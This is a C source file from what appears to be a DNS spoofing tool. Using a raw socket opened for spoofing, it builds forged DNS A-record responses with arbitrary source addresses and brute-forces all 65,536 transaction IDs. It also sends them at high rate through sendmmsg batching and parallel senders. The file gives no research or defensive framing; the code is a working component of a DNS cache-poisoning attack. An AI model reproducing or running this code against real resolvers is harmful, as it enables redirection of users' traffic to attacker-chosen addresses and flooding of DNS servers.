/*
    Utils help functions for sending DNS packets
*/

#include "sender.h"

// Check if sendmmsg is available
#ifdef HAVE_SENDMMSG_API
#include <sys/socket.h>
#endif

/*
    Free Single Packet
*/

static void free_packet(packet_t* packet) {
    if (!packet) return;
    if (packet->data) {
        free(packet->data);
        packet->data = NULL;
    }
    free(packet);
}

/*
    Gracefully Stop the UV Loop
*/
static void on_stop(uv_async_t* handle) {
    sender_t* sender = (sender_t*)handle->data;

    printf("\n[Async CB] Graceful shutdown initiated for sender.\n");
    if (sender->is_running) {
        sender_stop(sender);
    }
    uv_stop(sender->loop);
}

/*
    Help Clean the handle
*/
static void on_handle_free(uv_handle_t* handle) {
    free(handle);
}

/*
    Check if to Stop
*/

static void sender_check_stop(uv_timer_t* timer) {
    sender_t* sender = (sender_t*)timer->data;
    if (sender->stop_func && sender->stop_func(sender->state)) {
        printf("[Timer] Stop condition met, stopping sender.\n");
        uv_async_send(sender->stop_async);
        uv_timer_stop(timer);
    }
}

void free_batch_queue(sender_queue_t* queue) {
    if (!queue) return;
    packet_batch_t* current = queue->head;
    while (current) {
        packet_batch_t* next = current->next;
        arena_free(&current->arena); // Free the arena associated with the batch
        free(current); // Free the batch container itself
        current = next;
    }
    free(queue);
}

ssize_t default_send(sender_t* sender, packet_t* packet, void* send_args) {
    (void)send_args;
    if (!sender || !packet || !packet->data || packet->size == 0) {
        return BROKEN_ERROR;
    }
    struct sockaddr_in* send_addr;
    if (packet->dest_addr.sin_family != 0) {
        send_addr = &packet->dest_addr;
    } else if (sender->addr.sin_family != 0) {
        send_addr = &sender->addr;
    } else {
        fprintf(stderr, "No valid destination address found for sending packet.\n");
        return BROKEN_ERROR;
    }

    ssize_t sent = sendto(sender->sockfd, packet->data, packet->size, 0,
                          (struct sockaddr*)send_addr, sizeof(*send_addr));
    if (sent < 0) {
        perror("sendto");
        return -1; // Error
    }
    return sent; // Return number of bytes sent
}

/*
    Batch send using sendmmsg (Linux 2.6.34+)
    Sends up to count packets in a single syscall
*/
ssize_t batch_send(sender_t* sender, packet_t* packets, int count) {
    if (!sender || !packets || count <= 0) {
        return BROKEN_ERROR;
    }

#ifdef HAVE_SENDMMSG_API
    struct mmsghdr msgs[SENDMMSG_BATCH_SIZE];
    struct sockaddr_in addrs[SENDMMSG_BATCH_SIZE];
    struct iovec iovs[SENDMMSG_BATCH_SIZE];

    int batch_size = (count > SENDMMSG_BATCH_SIZE) ? SENDMMSG_BATCH_SIZE : count;
    int i;

    for (i = 0; i < batch_size; i++) {
        packet_t* pkt = &packets[i];
        if (!pkt || !pkt->data || pkt->size == 0) {
            break;
        }

        // Setup address
        if (pkt->dest_addr.sin_family != 0) {
            addrs[i] = pkt->dest_addr;
        } else if (sender->addr.sin_family != 0) {
            addrs[i] = sender->addr;
        } else {
            break; // No valid address
        }

        // Setup iovec
        iovs[i].iov_base = pkt->data;
        iovs[i].iov_len = pkt->size;

        // Setup mmsghdr
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &addrs[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(addrs[i]);
    }

    if (i == 0) {
        return BROKEN_ERROR;
    }

    int sent = sendmmsg(sender->sockfd, msgs, i, 0);
    if (sent < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            return 0; // Would block, retry later
        }
        perror("sendmmsg");
        return -1;
    }

    return sent;
#else
    // Fallback to individual sends
    ssize_t total_sent = 0;
    for (int i = 0; i < count; i++) {
        ssize_t sent = default_send(sender, &packets[i], NULL);
        if (sent < 0) {
            return total_sent > 0 ? total_sent : sent;
        }
        total_sent += sent;
    }
    return total_sent;
#endif
}


bool default_make(Arena* arena, packet_queue_t* queue, void* args) {
    if (!arena || !queue || !args) return false;

    default_make_args_t* d_args = (default_make_args_t*)args;
    printf("Building 65536 packets for %s -> %s (query: %s)\n", d_args->src_ip, d_args->dst_ip, d_args->domain_name);

    // 1. Create a template DNS response payload.
    struct dns_query* query[1];
    struct dns_answer* answer[1];
    
    query[0] = new_dns_query_a(arena, d_args->domain_name);
    answer[0] = new_dns_answer_a(arena, d_args->domain_name, inet_addr("8.8.8.8"), 3600);

    uint8_t* dns_payload = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, NULL, 0, NULL, 0, FALSE);

    uint8_t* packet_template = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                            inet_addr(d_args->src_ip), inet_addr(d_args->dst_ip),
                                            d_args->src_port, // Source port for DNS response
                                            d_args->dst_port, // Destination port
                                            dns_payload, dns_payload_len);

    // 3. Loop 65536 times, create a packet for each TXID, and add to the queue.
    for (uint32_t i = 0; i <= UINT16_MAX; i++) {
        // Create a new packet container
        packet_t* new_pkt = (packet_t*)arena_alloc(arena, sizeof(packet_t));
        new_pkt->data = (uint8_t*)arena_alloc(arena, packet_raw_len);
        new_pkt->size = packet_raw_len;
        new_pkt->next = NULL;

        // Copy the template
        memcpy(new_pkt->data, packet_template, packet_raw_len);

        // ** Modify the TXID **
        struct dnshdr* dnsh = (struct dnshdr*)(new_pkt->data + sizeof(struct iphdr) + sizeof(struct udphdr));
        dnsh->id = htons((uint16_t)i);
        if (queue->head == NULL) {
            queue->head = new_pkt;
            queue->tail = new_pkt;
        } else {
            queue->tail->next = new_pkt;
            queue->tail = new_pkt;
        }
    }
    return true;
}


void default_build_work_cb(uv_work_t* req) {
    packet_work_t* work = (packet_work_t*)req;
    sender_t* sender = work->sender_handle;
    
    // Get the strategy data which holds the function pointers
    default_strategy_data_t* s_data = (default_strategy_data_t*)sender->strategy->data;

    if (!s_data->make_func) {
        fprintf(stderr, "Missing necessary function pointers in strategy data.\n");
        work->error_code = BROKEN_ERROR;
        return;
    }

    work->batch = (packet_batch_t*)alloc_memory(sizeof(packet_batch_t));
    if (!work->batch) {
        fprintf(stderr, "Failed to allocate memory for packet batch.\n");
        work->error_code = INIT_ERROR;
        return;
    }
    
    // Use the functions and args from the strategy data
    if (!s_data->make_func(&work->batch->arena, &(work->batch->packets), s_data->packet_args)) {
        fprintf(stderr, "Failed to make packet.\n");
        work->error_code = MAKE_ERROR;
        arena_free(&work->batch->arena);
        free(work->batch);
        work->batch = NULL;
        return;
    }
    work->error_code = NOERROR;
}

void default_after_work_cb(uv_work_t* req, int status) {
    packet_work_t* work = (packet_work_t*)req;
    sender_t* sender = work->sender_handle;
    default_strategy_data_t* s_data = (default_strategy_data_t*)sender->strategy->data;

    if (status == UV_ECANCELED) {
        fprintf(stderr, "Work request was cancelled.\n");
        if (work->batch) {
            // Get the free function from the strategy to clean up
            arena_free(&work->batch->arena);
            free(work->batch);
        }
        free(work);
        return;
    }

    if (work->error_code != NOERROR) {
        fprintf(stderr, "Packet work failed with error code: %d\n", work->error_code);
        // Note: Cleanup should have already happened in the worker thread on MAKE_ERROR
        free(work);
        uv_async_send(sender->stop_async); // Stop the sender on error
        return;
    }

    if (work->batch && work->batch->packets.head) {
        sender_add_batch_to_queue(work->sender_handle, work->batch);
        // The sender_add_to_queue now owns the packets. We just free the container.
    } else if (work->batch) {
        #ifdef _DEBUG
        printf("default_after_work_cb: no packets were generated to send.\n");
        #endif
    }

    free(work);
}

void sender_add_batch_to_queue(sender_t* sender, packet_batch_t* batch) {
    if (!sender || !batch || !batch->packets.head) {
#ifdef _DEBUG
        printf("sender_ab_to_queue: can't add batch");
        if (!sender) {
            printf(", for no sender\n");
        }
        if (!batch) {
            printf(", for no batch\n");
        }
        if (!batch->packets.head) {
            printf(", for no packets in batch\n");
        }
#endif
        if (batch) {
            arena_free(&batch->arena);
            free(batch);
        }
        return;
    }
    sender_queue_t* queue = sender->send_queue;
    batch->next = NULL;
    if (queue->tail) {
        queue->tail->next = batch;
        queue->tail = batch;
    } else {
        queue->head = batch;
        queue->tail = batch;
    }
    if (sender->is_running && !uv_is_active((uv_handle_t*)sender->poll_handle)) {
#ifdef _DEBUG
        printf("[Sender] New batch added to idle queue. Activating poll handle.\n");
#endif
        uv_poll_start(sender->poll_handle, UV_WRITABLE, sender_poll_cb);
    }
}

void sender_poll_cb(uv_poll_t* handle, int status, int events) {
    sender_t* sender = (sender_t*)handle->data;
    sender_queue_t* queue = sender->send_queue;

    if (status < 0) {
        fprintf(stderr, "Poll error: %s\n", uv_strerror(status));
        return;
    }

    if (events & UV_WRITABLE) {
        // Batch sending using sendmmsg
#ifdef HAVE_SENDMMSG_API
        struct mmsghdr msgs[SENDMMSG_BATCH_SIZE];
        struct sockaddr_in addrs[SENDMMSG_BATCH_SIZE];
        struct iovec iovs[SENDMMSG_BATCH_SIZE];
        packet_t* pkt_batch[SENDMMSG_BATCH_SIZE];
        int batch_count = 0;

        while (true) {
            // Fill the batch
            while (batch_count < SENDMMSG_BATCH_SIZE) {
                if (sender->current_batch == NULL) {
                    if (queue->head == NULL) {
                        // No more packets to send
                        if (batch_count > 0) {
                            // Send remaining packets
                            int sent = sendmmsg(sender->sockfd, msgs, batch_count, 0);
                            if (sent < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                                perror("sendmmsg");
                            }
                        }
                        uv_poll_stop(sender->poll_handle);
                        return;
                    }
                    sender->current_batch = queue->head;
                    sender->current_packet = sender->current_batch->packets.head;
                    queue->head = queue->head->next;
                    if (queue->head == NULL) {
                        queue->tail = NULL;
                    }
                }

                if (sender->current_packet == NULL) {
#ifdef _DEBUG
                    printf("[Sender] Batch finished. Freeing its arena.\n");
#endif
                    packet_batch_t* to_free = sender->current_batch;
                    sender->current_batch = NULL;
                    arena_free(&to_free->arena);
                    free(to_free);
                    continue;
                }

                // Get destination address
                struct sockaddr_in* send_addr;
                if (sender->current_packet->dest_addr.sin_family != 0) {
                    send_addr = &sender->current_packet->dest_addr;
                } else if (sender->addr.sin_family != 0) {
                    send_addr = &sender->addr;
                } else {
                    sender->current_packet = sender->current_packet->next;
                    continue; // Skip packet without valid address
                }

                // Add to batch
                pkt_batch[batch_count] = sender->current_packet;
                iovs[batch_count].iov_base = sender->current_packet->data;
                iovs[batch_count].iov_len = sender->current_packet->size;
                addrs[batch_count] = *send_addr;

                memset(&msgs[batch_count], 0, sizeof(msgs[batch_count]));
                msgs[batch_count].msg_hdr.msg_iov = &iovs[batch_count];
                msgs[batch_count].msg_hdr.msg_iovlen = 1;
                msgs[batch_count].msg_hdr.msg_name = &addrs[batch_count];
                msgs[batch_count].msg_hdr.msg_namelen = sizeof(addrs[batch_count]);

                sender->current_packet = sender->current_packet->next;
                batch_count++;
            }

            // Send the batch
            if (batch_count > 0) {
                int sent = sendmmsg(sender->sockfd, msgs, batch_count, 0);
                if (sent < 0) {
                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
                        // Socket buffer full, wait for next writable event
                        return;
                    }
                    perror("sendmmsg");
                }
                // [DEBUG] printf("[Sender] sendmmsg sent %d packets\n", sent);
                batch_count = 0;
            }
        }
#else
        // Fallback to single packet sending
        while (true) {
            if (sender->current_batch == NULL) {
                if (queue->head == NULL) {
                    uv_poll_stop(sender->poll_handle);
                    return;
                }
                sender->current_batch = queue->head;
                sender->current_packet = sender->current_batch->packets.head;
                queue->head = queue->head->next;
                if (queue->head == NULL) {
                    queue->tail = NULL;
                }
            }
            if (sender->current_packet == NULL) {
#ifdef _DEBUG
                printf("[Sender] Batch finished. Freeing its arena.\n");
#endif
                arena_free(&sender->current_batch->arena);
                free(sender->current_batch);
                sender->current_batch = NULL;
                continue;
            }
            ssize_t sent = sender->strategy->send_func(sender, sender->current_packet, sender->strategy->send_args);

            if (sent < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    return;
                } else {
                    perror("sendto in poll_cb");
                }
            }
            sender->current_packet = sender->current_packet->next;
        }
#endif
    }
}

int sender_init(
    sender_t* sender, 
    uv_loop_t* loop, 
    const char* ip, 
    int port
) {
    if (!sender || !loop || !ip) return INIT_ERROR;

    memset(sender, 0, sizeof(sender_t));
    sender->loop = loop;

    // Create raw socket
    sender->sockfd = make_sockfd_for_spoof();

    // Make socket non-blocking
    int flags = fcntl(sender->sockfd, F_GETFL, 0);
    if (flags < 0) {
        perror("fcntl(F_GETFL)");
        close(sender->sockfd);
        return INIT_ERROR;
    }
    if (fcntl(sender->sockfd, F_SETFL, flags | O_NONBLOCK) < 0) {
        perror("fcntl(F_SETFL)");
        close(sender->sockfd);
        return INIT_ERROR;
    }
    
    // Create Sending Queue
    sender_queue_t* queue = (sender_queue_t*)alloc_memory(sizeof(sender_queue_t));
    if (!queue) {
        close(sender->sockfd);
        return INIT_ERROR;
    }
    queue->head = NULL;
    queue->tail = NULL;
    sender->send_queue = queue;

    // Create Poll Handle Used for Socket
    sender->poll_handle = (uv_poll_t*)alloc_memory(sizeof(uv_poll_t));
    if (!sender->poll_handle) {
        free(queue);
        close(sender->sockfd);
        return INIT_ERROR;
    }
    uv_poll_init_socket(loop, sender->poll_handle, sender->sockfd);
    sender->poll_handle->data = sender; // Link back to sender
    
    // Create Sockaddr_in 
    uv_ip4_addr(ip, port, &sender->addr);

    // Create Stop Async for Stop
    sender->stop_async = (uv_async_t*)alloc_memory(sizeof(uv_async_t));
    if (!sender->stop_async) {
        free(sender->poll_handle);
        free(queue);
        close(sender->sockfd);
        return INIT_ERROR;
    }
    uv_async_init(loop, sender->stop_async, on_stop);
    sender->stop_async->data = sender;
    uv_unref((uv_handle_t*)sender->stop_async); // don't care much about the background-handle

    // Set Stop Condition to NULL !!!
    // if needed, please run sender_set_stop_cond()
    sender->stop_timer = NULL;
    sender->stop_func = NULL;
    sender->state = NULL;
    sender->free_func = NULL;

    // Set sender Not Running !!!
    sender->is_running = false;
    return 0;
}


void sender_free(sender_t* sender) {
    if (!sender) return;

    if (sender->strategy) {
        sender_stop(sender); 
        if (sender->strategy->free_send_args_func && sender->strategy->send_args) {
            sender->strategy->free_send_args_func(sender->strategy->send_args);
        }
        sender->strategy->free_data(sender->strategy->data);
        free(sender->strategy);
        sender->strategy = NULL;
    }

    // Free queue
    free_batch_queue(sender->send_queue);
    sender->send_queue = NULL;
    if (sender->current_batch) {
        arena_free(&sender->current_batch->arena);
        free(sender->current_batch);
        sender->current_batch = NULL;
    }

    // Stop timer
    if (sender->stop_timer) {
        if (uv_is_active((uv_handle_t*)sender->stop_timer)) {
            uv_timer_stop(sender->stop_timer);
        }
        if (!uv_is_closing((uv_handle_t*)sender->stop_timer)) {
            uv_close((uv_handle_t*)sender->stop_timer, on_handle_free);
        }
        sender->stop_timer = NULL;
    }

    // Free Stop Timer Data
    if (sender->free_func && sender->state) {
        sender->free_func(sender->state);
        sender->state = NULL;
        sender->free_func = NULL;
    }

    // Stop polling if it's active
    if (uv_is_active((uv_handle_t*)sender->poll_handle)) {
        uv_poll_stop(sender->poll_handle);
    }
    if (!uv_is_closing((uv_handle_t*)sender->poll_handle)) {
        uv_close((uv_handle_t*)sender->poll_handle, on_handle_free);
    }
    // Ensure we close it properly. uv_close is async.
    if (sender->stop_async && !uv_is_closing((uv_handle_t*)sender->stop_async)) {
        uv_close((uv_handle_t*)sender->stop_async, on_handle_free);
    }
    // Free the poll handle
    close(sender->sockfd);
}

void sender_start(sender_t* sender) {
    if (!sender || !sender->strategy || sender->is_running) {
#ifdef _DEBUG
        printf("sender_start: fail to start");
        if (!sender) {
            printf(", for no sender\n");
        }
        if (!sender->strategy) {
            printf(", for no strategy\n");
        }
        if (sender->is_running) {
            printf(", for is running\n");
        }
#endif
        return;
    }
    sender->is_running = true;
    sender->strategy->start(sender, sender->strategy->data);
}

void sender_stop(sender_t* sender) {
    if (!sender || !sender->strategy || !sender->is_running) {
#ifdef _DEBUG
        printf("sender_stop: fail to stop");
        if (!sender) {
            printf(", for no sender\n");
        }
        if (!sender->strategy) {
            printf(", for no strategy\n");
        }
        if (!sender->is_running) {
            printf(", for not running\n");
        }
#endif
        return;
    }
    sender->strategy->stop(sender, sender->strategy->data);
    sender->is_running = false;
}


int sender_set_strategy(sender_t* sender, sender_strategy_t* strategy) {
    if (!sender || !strategy) return BROKEN_ERROR;
    
    if (sender->strategy) {
        if (sender->is_running) {
            sender_stop(sender); // Stop before freeing
        }
        sender->strategy->free_data(sender->strategy->data);
        free(sender->strategy);
    }
    
    sender->strategy = strategy;
    return NOERROR;
}

int sender_set_stop_cond(
    sender_t *sender,
    stop_func stop_func,
    void *state,
    free_func free_func,
    uint64_t interval // MilliSeconds
) {
    if (!sender || !stop_func) {
#ifdef _DEBUG
        printf("sender_set_stop_cond: error");
        if (!sender) {
            printf(" ,for no sender\n");
        }
        if (!stop_func) {
            printf(" ,for no stop_func\n");
        }
#endif
        return BROKEN_ERROR;
    }

    // Check if stop timer exists
    if (sender->stop_timer) {
        uv_timer_stop(sender->stop_timer);
        uv_close((uv_handle_t*)sender->stop_timer, on_handle_free);
        
        if (sender->free_func && sender->state) {
            sender->free_func(sender->state);
        }
    }

    // Re-alloc for stop timer
    sender->stop_timer = (uv_timer_t*)alloc_memory(sizeof(uv_timer_t));
    if (!sender->stop_timer) {
        return INIT_ERROR;
    }

    // Init stop timer
    uv_timer_init(sender->loop, sender->stop_timer);

    // Save stop condition callback and state
    sender->stop_func = stop_func;
    sender->state = state;
    sender->free_func = free_func;

    // Attach sender as data to the timer for access in the callback
    sender->stop_timer->data = sender;

    // Start stop timer
    uv_timer_start(sender->stop_timer, sender_check_stop, interval, interval);

    return NOERROR;
}


/*
    More Specified Functions
*/

bool pps_make(Arena* arena, packet_queue_t* queue, void* args) {
    if (!queue || !args) return false;

    default_make_args_t* d_args = (default_make_args_t*)args;

    // 1. Create a template DNS response payload.
    struct dns_query* query[1];
    struct dns_answer* answer[1];

    query[0] = new_dns_query_a(arena, d_args->domain_name);
    answer[0] = new_dns_answer_a(arena, d_args->domain_name, inet_addr("8.8.8.8"), 3600);

    uint8_t* dns_payload = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, NULL, 0, NULL, 0, FALSE);

    uint8_t* packet_template = (uint8_t*)arena_alloc(arena, DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                            inet_addr(d_args->src_ip), inet_addr(d_args->dst_ip),
                                            d_args->src_port,
                                            d_args->dst_port,
                                            dns_payload, dns_payload_len);

    // 2. Loop `packets_to_generate` times, using the shared counter for TXID.
    for (size_t i = 0; i < ((pps_make_args_t*)d_args)->count; i++) {
        packet_t* new_pkt = (packet_t*)arena_alloc(arena, sizeof(packet_t));
        new_pkt->data = (uint8_t*)arena_alloc(arena, packet_raw_len);
        memset(&new_pkt->dest_addr, 0, sizeof(new_pkt->dest_addr));
        new_pkt->size = packet_raw_len;
        new_pkt->next = NULL;

        memcpy(new_pkt->data, packet_template, packet_raw_len);

        // ** Modify the TXID using the shared, incrementing counter **
        struct dnshdr* dnsh = (struct dnshdr*)(new_pkt->data + sizeof(struct iphdr) + sizeof(struct udphdr));
        dnsh->id = htons(get_tx_id());

        if (queue->head == NULL) {
            queue->head = new_pkt;
            queue->tail = new_pkt;
        } else {
            queue->tail->next = new_pkt;
            queue->tail = new_pkt;
        }
    }
    return true;
}

/*
    =============================================
    Multi-Sender Implementation
    =============================================
*/

static void multi_sender_check_stop(uv_timer_t* timer) {
    // Placeholder for multi-sender stop logic
    (void)timer;
}

int multi_sender_init(multi_sender_t* ms, uv_loop_t* loop, multi_sender_config_t* config) {
    if (!ms || !loop || !config) {
        return INIT_ERROR;
    }

    memset(ms, 0, sizeof(multi_sender_t));
    ms->loop = loop;
    ms->num_active = 0;
    ms->is_running = false;
    ms->packets_sent = 0;
    pthread_mutex_init(&ms->stats_mutex, NULL);

    int num_senders = config->num_senders;
    if (num_senders <= 0) num_senders = 1;
    if (num_senders > MAX_SENDER_INSTANCES) num_senders = MAX_SENDER_INSTANCES;

    ms->num_active = num_senders;

    // Initialize each sender
    for (int i = 0; i < num_senders; i++) {
        int ret = sender_init(&ms->senders[i], loop, config->dst_ip, config->dst_port);
        if (ret != 0) {
            fprintf(stderr, "Failed to initialize sender %d\n", i);
            // Cleanup previously initialized senders
            for (int j = 0; j < i; j++) {
                sender_free(&ms->senders[j]);
            }
            pthread_mutex_destroy(&ms->stats_mutex);
            return INIT_ERROR;
        }
    }

    return NOERROR;
}

void multi_sender_start(multi_sender_t* ms) {
    if (!ms || ms->is_running) {
        return;
    }

    ms->is_running = true;

    // Start each sender
    for (int i = 0; i < ms->num_active; i++) {
        sender_start(&ms->senders[i]);
    }

#ifdef _DEBUG
    printf("[Multi-Sender] Started %d sender instances\n", ms->num_active);
#endif
}

void multi_sender_stop(multi_sender_t* ms) {
    if (!ms || !ms->is_running) {
        return;
    }

    // Stop each sender
    for (int i = 0; i < ms->num_active; i++) {
        sender_stop(&ms->senders[i]);
    }

    ms->is_running = false;

#ifdef _DEBUG
    printf("[Multi-Sender] Stopped. Total packets sent: %llu\n",
           (unsigned long long)ms->packets_sent);
#endif
}

void multi_sender_free(multi_sender_t* ms) {
    if (!ms) return;

    // Free each sender
    for (int i = 0; i < ms->num_active; i++) {
        sender_free(&ms->senders[i]);
    }

    pthread_mutex_destroy(&ms->stats_mutex);
    memset(ms, 0, sizeof(multi_sender_t));
}

uint64_t multi_sender_get_packets_sent(multi_sender_t* ms) {
    if (!ms) return 0;

    pthread_mutex_lock(&ms->stats_mutex);
    uint64_t count = ms->packets_sent;
    pthread_mutex_unlock(&ms->stats_mutex);
    return count;
}